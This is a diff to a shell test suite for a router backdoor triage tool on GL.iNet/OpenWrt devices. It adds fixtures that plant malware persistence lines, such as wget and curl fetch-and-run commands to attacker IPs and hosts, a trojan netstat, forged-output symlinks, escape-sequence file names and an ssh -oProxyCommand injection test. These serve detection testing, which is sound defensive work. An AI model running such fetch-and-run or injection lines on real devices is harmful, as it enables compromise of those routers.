@@ -179,12 +179,17 @@ fi
 echo; echo "=== 5. OpenWrt, netstat installed by a package (apk) -> INFO only"
 D=$(mkscen pkg "$OWL"); U=$D/u
 mkdir -p "$U/usr/bin" "$U/lib/apk/db"
-printf 'real netstat\n' >"$U/usr/bin/netstat"
+printf '\177ELF real netstat\n' >"$U/usr/bin/netstat"
 { cat "$OWL/lib/apk/db/installed"; printf 'P:net-tools-netstat\nF:usr/bin\nR:netstat\n\n'; } >"$U/lib/apk/db/installed"
 mnt "$D" "$OWL"
 run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 grep -E '^ +(IOC|PERSIST|REVIEW|INFO) |Summary' "$D/check.txt"
 expect "package netstat is INFO, exit 0" '[ $rc = 0 ] && grep -q "installed by package net-tools-netstat" "$D/check.txt"'
+# the list of packages lies in the overlay too: a text file that it names is not believed
+# to be the package's program (review of 2.55)
+printf 'trojan\n' >"$D/m/usr/bin/netstat"
+run "$D" "$OWL" --check >"$D/check2.txt"; rc=$?
+expect "a text file the list of packages names is REVIEW applet-replaced, not INFO" '[ $rc = 0 ] && grep -q "REVIEW  *applet-replaced  */usr/bin/netstat" "$D/check2.txt" && ! grep -q "installed by package net-tools-netstat" "$D/check2.txt"'
 umount "$D/m"
 
 echo; echo "=== 6. OpenWrt with opkg (firmware 4.x), netstat installed by a package -> INFO only"
@@ -192,7 +197,7 @@ OWO=$BASE/openwrt-rom-opkg
 cp -a "$OWL" "$OWO"; rm -rf "$OWO/lib/apk"; mkdir -p "$OWO/usr/lib/opkg/info"
 D=$(mkscen opkg "$OWO"); U=$D/u
 mkdir -p "$U/usr/bin" "$U/usr/lib/opkg/info"
-printf 'real netstat\n' >"$U/usr/bin/netstat"
+printf '\177ELF real netstat\n' >"$U/usr/bin/netstat"
 printf '/usr/bin/netstat\n' >"$U/usr/lib/opkg/info/net-tools-netstat.list"
 mnt "$D" "$OWO"
 run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
@@ -707,9 +712,9 @@ run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 expect "a fetch from a server in rc.local and the root crontab is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server of the malware (65.20.71.131)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "gl-inet.top"'
 expect "a line that blocks and fetches counts as fetching" 'grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/98-both" "$D/check.txt"'
 expect "fetch lines in the firmware's crontabs are IOC cron-ref" 'grep -q "IOC  *cron-ref  */tmp/gl_crontabs/root" "$D/check.txt" && grep -q "IOC  *cron-ref  */etc/gl_crontabs/crontabs.d/tasks" "$D/check.txt"'
-expect "a server named in a variable is REVIEW, not IOC (the limit of the line rule)" 'grep -q "REVIEW  *server-ref  */etc/init.d/zz-indirect" "$D/check.txt"'
+expect "a server named in a variable that a fetch uses is IOC persist-ref (review of 2.55)" 'grep -A1 "IOC  *persist-ref  */etc/init.d/zz-indirect" "$D/check.txt" | grep -q "fetches from a server"'
 run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
-expect "--fix resets rc.local and the crontab and removes the fetching file (exit $rc)" '[ $rc = 2 ] && ! grep -q 65.20.71.131 "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/hotplug.d/iface/98-both" ] && [ -f "$D/m/etc/init.d/zz-indirect" ]'
+expect "--fix resets rc.local and the crontab and removes the fetching file (exit $rc)" '[ $rc = 2 ] && ! grep -q 65.20.71.131 "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/hotplug.d/iface/98-both" ] && [ ! -e "$D/m/etc/init.d/zz-indirect" ]'
 expect "--fix drops only the fetch lines from the firmware's crontabs" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q gl-inet.top "$D/m/tmp/gl_crontabs/root" && grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q rtty "$D/m/etc/gl_crontabs/crontabs.d/tasks"'
 umount "$D/m"
 
@@ -935,19 +940,19 @@ expect "the address is short: the host, a # and nine characters without I, L, O 
 mkdir -p "$D/m/tmp" "$D/m/etc/config"; mkfifo "$D/m/tmp/f"; printf '#!/bin/sh\nmy-own-thing\n' >"$D/m/etc/rc.local"
 printf "config cloud\n\toption enable '1'\n" >"$D/m/etc/config/gl-cloud"; printf 'x http://up.adguardns.org/\n' >"$D/m/etc/config/other"
 run "$D" "$OWL" --check >"$D/check2.txt"
-GL_TRIAGE_RESULT_URL=https://example.org/x/ run "$D" "$OWL" --fix >"$D/fix.txt"
+GL_TRIAGE_RESULT_URL=http://127.0.0.1/x/ run "$D" "$OWL" --fix >"$D/fix.txt"
 if command -v node >/dev/null 2>&1; then
 	V=$(sed -n 's/^VERSION=//p' "$T")
 	expect "clean: this version, a router, no findings, GoodCloud not known" '[ "$(readcode "$D/check.txt" 1 csa.gl-i.net)" = "v=$V p=r k= g=x n=0 f=0 rv=0" ]'
 	readcode "$D/check2.txt" 1 csa.gl-i.net
 	expect "pipe, changed rc.local and a backdoor server: their kinds, GoodCloud on" '[ "$(readcode "$D/check2.txt" 1 csa.gl-i.net)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=0 rv=0" ]'
-	expect "after --fix the address still names what was found, and says the fix is incomplete" '[ "$(readcode "$D/fix.txt" 1 example.org/x)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=3 rv=0" ]'
+	expect "after --fix the address still names what was found, and says the fix is incomplete" '[ "$(readcode "$D/fix.txt" 1 127.0.0.1/x)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=3 rv=0" ]'
 else
 	echo "  SKIP: reading the codes back needs node"
 fi
 expect "the result with its address comes after the GoodCloud advice, the address right under the verdict" 'grep -A8 "Verdict:" "$D/check.txt" | grep -q "csa.gl-i.net/#" && [ "$(grep -n "^== GoodCloud" "$D/check.txt" | head -n 1 | cut -d: -f1)" -lt "$(grep -n "^== Result" "$D/check.txt" | head -n 1 | cut -d: -f1)" ] && [ "$(grep -c "^== GoodCloud" "$D/check.txt")" = 1 ]'
 expect "on a device with traces the next steps follow the result" '[ "$(grep -n "^== Result" "$D/check2.txt" | head -n 1 | cut -d: -f1)" -lt "$(grep -n "^== Next steps" "$D/check2.txt" | head -n 1 | cut -d: -f1)" ]'
-expect "with --fix the address is given once, under the verdict after the clean-up" '[ "$(grep -c "https://example.org/x/#" "$D/fix.txt")" = 1 ] && grep -A25 "^== Result after remediation" "$D/fix.txt" | grep -q "https://example.org/x/#" && [ "$(grep -c "^== GoodCloud" "$D/fix.txt")" = 1 ]'
+expect "with --fix the address is given once, under the verdict after the clean-up" '[ "$(grep -c "http://127.0.0.1/x/#" "$D/fix.txt")" = 1 ] && grep -A25 "^== Result after remediation" "$D/fix.txt" | grep -q "http://127.0.0.1/x/#" && [ "$(grep -c "^== GoodCloud" "$D/fix.txt")" = 1 ]'
 # model and firmware: a second part of five characters, where both are known
 mkdir -p "$D/m/tmp/sysinfo" "$D/m/etc"; echo 'GL.iNet GL-MT6000' >"$D/m/tmp/sysinfo/model"; echo 4.9.1 >"$D/m/etc/glversion"; echo release2 >"$D/m/etc/version.type"
 run "$D" "$OWL" --check >"$D/check3.txt"
@@ -1046,6 +1051,8 @@ expect "the same state file written on its own is still cloud-command" 'grep -q 
 umount "$D/m"
 bash "$(dirname "$T")/triage-remote.sh" -p >"$BASE/tr.txt" 2>&1; rc=$?
 expect "triage-remote.sh: -p without a value stops with exit 4" '[ $rc = 4 ] && grep -q "needs a value" "$BASE/tr.txt"'
+bash "$(dirname "$T")/triage-remote.sh" root@192.0.2.1 -oProxyCommand=true >"$BASE/tr.txt" 2>&1; rc=$?
+expect "triage-remote.sh: a device that starts with - is refused before ssh sees it (review of 2.55)" '[ $rc = 4 ] && grep -q "not a device: -oProxyCommand=true" "$BASE/tr.txt"'
 
 echo "=== --changes: the files that differ from the base image, on request only"
 D=$(mkscen chg "$OWL"); U=$D/u
@@ -1068,6 +1075,129 @@ expect "--changes without an overlay compares the running system with the base i
 umount "$D/m"
 triage --root "$NB" -o "$NB/out" --changes >"$BASE/chg4.txt" 2>&1; rc=$?
 expect "--changes with neither says so and stops with exit 4" '[ $rc = 4 ] && grep -q "No list of changes" "$BASE/chg4.txt"'
+
+echo "=== review of 2.55: forged findings, hidden starts, names that are patterns"
+D=$(mkscen r255a "$OWL"); U=$D/u
+mkdir -p "$U/usr/bin" "$U/etc/init.d" "$U/etc/profile.d" "$U/etc/rc.d" "$U/etc/config" "$U/lib/apk/db" "$BASE/r255victim"
+echo secret >"$BASE/r255victim/secret.txt"
+TAB=$(printf '\t')
+# a link's target with a line break in it made findings lines of its own
+ln -s "x
+INFO${TAB}package-file${TAB}/etc/init.d/evil${TAB}installed by package base-files" "$U/usr/bin/foo"
+ln -s "x
+IOC${TAB}persist-ref${TAB}/../../r255victim/secret.txt${TAB}starts the malware (x)" "$U/usr/bin/bar"
+ln -s "x
+IOC${TAB}persist-ref${TAB}/${TAB}starts the malware (x)" "$U/usr/bin/baz"
+printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/evil"
+# the shape of a copy of this script, and the header of compiled Lua, with a start behind it
+{ printf '#!/bin/sh\n# gl-helper-triage.sh - triage\nVERSION=2.55\nIOC_RE=x\nBD_HOST_RE=x\n'; printf '/etc/config/.gl/gl-helper &\n'; } >"$U/etc/init.d/zz-copy"
+{ printf '\033LuaQ\n/etc/config/.gl/gl-helper &\n'; head -c 1200 /dev/zero | tr '\0' '#'; echo; } >"$U/etc/init.d/yy-lua"
+# a list of packages in the overlay that claims an init script
+{ cat "$OWL/lib/apk/db/installed"; printf 'P:evilpkg\nF:etc/init.d\nR:pkgd\n\n'; } >"$U/lib/apk/db/installed"
+printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/pkgd"
+# a name that is a pattern for another: b.sh starts the malware, bXsh does not
+printf '/etc/config/.gl/gl-helper &\n' >"$U/etc/profile.d/b.sh"
+printf 'true\n' >"$U/etc/profile.d/bXsh"
+# names with a line break and with an escape sequence
+printf '/etc/config/.gl/gl-helper &\n' >"$U/etc/profile.d/a
+b.sh"
+printf 'echo hello\n' >"$U/etc/profile.d/c
+d.sh"
+printf 'x\n' >"$U/etc/init.d/e$(printf '\033')[2Jf"
+# a link into the malware's directory
+ln -s /etc/config/.gl/boot.sh "$U/etc/rc.d/S98yy"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW|INFO) ' "$D/check.txt" | tr '\033' '~'
+expect "a link target with a line break makes no findings line of its own" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/evil" "$D/check.txt" && ! grep -q "INFO  *package-file  */etc/init.d/evil" "$D/check.txt" && ! grep -qE "^ +IOC  *persist-ref  *(/|/\.\./\.\./r255victim/secret\.txt) *$" "$D/check.txt"'
+expect "the shape of a copy of this script or of compiled Lua hides no start, nor does a package that claims the file" 'grep -q "IOC  *persist-ref  */etc/init.d/zz-copy" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/yy-lua" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/pkgd" "$D/check.txt"'
+expect "a name is no pattern: b.sh is IOC, bXsh only new" 'grep -q "IOC  *persist-ref  */etc/profile.d/b.sh" "$D/check.txt" && grep -q "REVIEW  *new  */etc/profile.d/bXsh" "$D/check.txt"'
+expect "a name with a line break is read: what starts the malware is IOC, the other REVIEW odd-name" 'grep -q "IOC  *persist-ref  *?/etc/profile.d/a?b.sh" "$D/check.txt" && grep -q "REVIEW  *odd-name  *?/etc/profile.d/c?d.sh" "$D/check.txt" && ! grep -q "/etc/profile.d/a *$" "$D/check.txt"'
+expect "no escape sequence reaches the screen" '! grep -q "$(printf "\033")" "$D/check.txt"'
+expect "a link into the malware's directory is IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/rc.d/S98yy" "$D/check.txt"'
+run "$D" "$OWL" --archive >"$D/arch.txt" 2>&1
+expect "the archive holds nothing from outside the root" '[ -n "$(ls "$D"/out/*.tar.gz 2>/dev/null)" ] && ! tar -tzf "$(ls "$D"/out/*.tar.gz | head -n 1)" | grep -q secret'
+run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+expect "--fix takes out the file with a line break that starts the malware, keeps the other and all outside the root" '[ ! -e "$D/m/etc/profile.d/a
+b.sh" ] && [ -e "$D/m/etc/profile.d/c
+d.sh" ] && [ -f "$BASE/r255victim/secret.txt" ] && [ -d "$D/m/etc/config" ] && [ -f "$D/m/etc/profile.d/bXsh" ] && [ -d "$D/m/usr" ]'
+umount "$D/m"
+
+echo "=== review of 2.55: an owner's guard is no start, and --fix leaves it"
+D=$(mkscen r255b "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf '# Put your custom commands here\nlogger -t guard "nothing found; gl-helper not running"\nwget -q --spider http://cdn.adguardns.com/ || logger "block holds"\nexit 0\n' >"$U/etc/rc.local"
+cat >"$U/etc/init.d/cleanup" <<'X'
+#!/bin/sh /etc/rc.common
+START=99
+PATHS="
+/etc/glinet/.cache
+/etc/config/.gl
+"
+start() {
+	for p in $PATHS; do rm -rf "$p"; done
+	cat <<NOTE
+note: /etc/config/.gl removed
+NOTE
+}
+X
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|PERSIST|REVIEW|INFO) ' "$D/check.txt"
+expect "a guard with ; in quotes, a list of paths over lines, a note and a probe start nothing (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "REVIEW  *path-ref  */etc/init.d/cleanup" "$D/check.txt"'
+run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+expect "--fix changes none of them (exit $rc)" '[ $rc = 0 ] && grep -q "logger -t guard" "$D/m/etc/rc.local" && [ -f "$D/m/etc/init.d/cleanup" ]'
+umount "$D/m"
+D=$(mkscen r255c "$OWL"); U=$D/u
+mkdir -p "$U/etc/config/.gl"
+echo x >"$U/etc/config/.gl/gl-helper"
+printf '# Put your custom commands here\n. /lib/functions/gl_util.sh\nremount_ubifs\nexit 0\n' >"$U/etc/rc.local"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+expect "--fix leaves an rc.local that has only the firmware's own lines (exit $rc)" '[ $rc = 2 ] && grep -q remount_ubifs "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/config/.gl" ]'
+umount "$D/m"
+
+echo "=== review of 2.55: starts that 2.55 did not see"
+D=$(mkscen r255d "$OWL"); U=$D/u
+mkdir -p "$U/etc/crontabs" "$U/etc/hotplug.d/iface" "$U/etc/init.d"
+printf '*/3 * * * * flock -n /tmp/.wl /etc/config/.gl/watch.sh >/dev/null 2>&1\n' >"$U/etc/crontabs/root"
+printf '# Put your custom commands here\n: $(/etc/config/.gl/boot.sh)\nexit 0\n' >"$U/etc/rc.local"
+printf '#!/bin/sh\nSRV=66.245.219.252\nPORT=8899\ncurl -fsS -o /tmp/n5 "http://$SRV:$PORT/n5" && chmod +x /tmp/n5 && /tmp/n5 &\n' >"$U/etc/hotplug.d/iface/99-net"
+printf 'wget -qO- http://GL-INET.TOP:8899/w | sh\n' >"$U/etc/init.d/upper"
+printf 'trap "/etc/config/.gl/gl-helper &" EXIT\n' >"$U/etc/init.d/trap"
+printf 'echo x | xargs /etc/config/.gl/gl-helper\n' >"$U/etc/init.d/xargs"
+printf 'find /tmp -name x -exec /etc/config/.gl/gl-helper {} \\;\n' >"$U/etc/init.d/find"
+printf 'PROG=/etc/config/.gl/gl-helper\nprocd_set_param command "$PROG"\n' >"$U/etc/init.d/prog"
+printf 'sh /etc/glinet/.cache//watch.sh\n' >"$U/etc/init.d/slash"
+mnt "$D" "$OWL"
+GL_TRIAGE_RESULT_URL=https://evil.example/ run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
+expect "flock in cron, \$( ) in rc.local, a server in variables, an upper-case host: each IOC persist-ref" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/99-net" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/upper" "$D/check.txt"'
+expect "trap, xargs, find -exec, a program in a variable and a path with // each IOC persist-ref" '(for n in trap xargs find prog slash; do grep -q "IOC  *persist-ref  */etc/init.d/$n" "$D/check.txt" || exit 1; done)'
+expect "an address for the result page from the environment is not taken unless it is this machine" 'grep -q "csa.gl-i.net/#" "$D/check.txt" && ! grep -q evil.example "$D/check.txt"'
+umount "$D/m"
+
+echo "=== review of 2.55: a KVM without a base image to put back"
+D=$(mkscen r255k "$OWL"); U=$D/u
+mkdir -p "$U/usr/bin" "$U/etc/config/.gl"
+printf '#!/bin/sh\n/bin/busybox netstat "$@" | grep -v 65.20\n' >"$U/usr/bin/netstat"; chmod 755 "$U/usr/bin/netstat"
+echo x >"$U/etc/config/.gl/gl-helper"
+mnt "$D" "$OWL"
+triage --root "$D/m" --upper "$U" -o "$D/out" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
+if env PATH="$TRIAGE_PATH" sh -c 'busybox --list' 2>/dev/null | grep -qx netstat; then
+	expect "--fix without a base image puts netstat back as a link to busybox (exit $rc)" '[ $rc = 2 ] && [ -L "$D/m/usr/bin/netstat" ] && [ "$(readlink "$D/m/usr/bin/netstat")" = /bin/busybox ]'
+else
+	expect "--fix without a base image and without busybox says to put netstat back (exit $rc)" '[ ! -e "$D/m/usr/bin/netstat" ] && grep -q "/usr/bin/netstat is gone now" "$D/fix.txt"'
+fi
+umount "$D/m"
+
+echo "=== review of 2.55: a # in the path of the upper layer"
+D=$(mkscen 'r255#h' "$OWL"); U=$D/u
+mkdir -p "$U/usr/bin"; printf 'trojan\n' >"$U/usr/bin/netstat"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "the netstat that shadows the link is IOC applet-hijack (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *applet-hijack  */usr/bin/netstat" "$D/check.txt"'
+umount "$D/m"
 
 echo "=== what the base image's busybox loads must be the base image's (issue 8)"
 OWB=$BASE/openwrt-rom-libs
@@ -1220,6 +1350,29 @@ if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
 	expect "the summary counts a line with the owner's and the attacker's address, not 127.0.0.1" 'grep -q "2 of them hold IP addresses that are not the attacker" "$L/ask2.txt"'
 	expect "the summary names the accounts, and how many more the report holds" 'grep -q "Also the name of each account the firmware does not have: jsmith-admin zz1 .* zz7 and 1 more" "$L/ask2.txt" && grep -q "What stands in the" "$L/ask2.txt" && ! grep -q "Not sent: host name, keys, passwords" "$L/ask2.txt"'
 	rm "$L/etc/rc.local" "$L/etc/passwd"
+	# review of 2.55: command lines are read as sh reads them, and print nothing raw
+	fp 5051 vi 'vi\0/usr/bin/monitord\0'
+	fp 5052 tail 'tail\0-f\0/var/log/monitord.pid.log\0'
+	fp 5053 sh 'sh\0-c\0S=65.20.71.131; wget -qO- http://$S:8000/ni.sh | sh\0'
+	fp 5054 sh '/bin/sh\0/etc/glinet/.cache//watch.sh\0'
+	fp 5055 sleep 'sleep\000100\0\033]0;x\007\033[1A\0'
+	live --no-report >"$L/procs6.txt"
+	grep -E '^ +(IOC|REVIEW) ' "$L/procs6.txt" | tr '\033' '~'
+	expect "an editor or tail that names monitord is not the backdoor" '! grep -qE "(process|backdoor-proc)  *505[12]" "$L/procs6.txt"'
+	expect "a server in a variable and a path with // are IOC process" 'grep -q "IOC  *process  *5053" "$L/procs6.txt" && grep -q "IOC  *process  *5054" "$L/procs6.txt"'
+	expect "no escape sequence of a command line reaches the screen" '! grep -q "$(printf "\033")" "$L/procs6.txt"'
+	rm -r "$L"/proc/505?
+	# a running device with /rom but no upper layer to be seen: the places that start
+	# programs are read all the same; an upper layer that something hides is said
+	mkdir -p "$L/rom/bin" "$L/rom/etc" "$L/etc/init.d"; cp "$BB" "$L/rom/bin/busybox"
+	echo "DISTRIB_ID='OpenWrt'" >"$L/etc/openwrt_release"; cp "$L/etc/openwrt_release" "$L/rom/etc/"
+	printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$L/etc/init.d/evil"
+	live --no-report >"$L/rom.txt"
+	expect "with /rom but no upper layer, an init script that starts the malware is IOC" 'grep -q "IOC  *persist-ref  */etc/init.d/evil" "$L/rom.txt"'
+	mkdir -p "$L/proc"; echo "overlayfs:/overlay/upper / overlay rw,noatime,lowerdir=/,upperdir=/overlay/upper,workdir=/overlay/work 0 0" >"$L/proc/mounts"
+	live --no-report >"$L/hid.txt"
+	expect "an upper layer that cannot be seen is REVIEW overlay-hidden" 'grep -q "REVIEW  *overlay-hidden  */overlay/upper" "$L/hid.txt"'
+	rm -r "$L/rom" "$L/etc/init.d" "$L/proc/mounts" "$L/etc/openwrt_release"
 	# Tools that are not busybox applets (issue 8): run only when they are the base image's.
 	# The chroot gets a base image with the same busybox and an iptables-save that prints
 	# the rule the attack leaves; first the same file in the system, then a changed one.
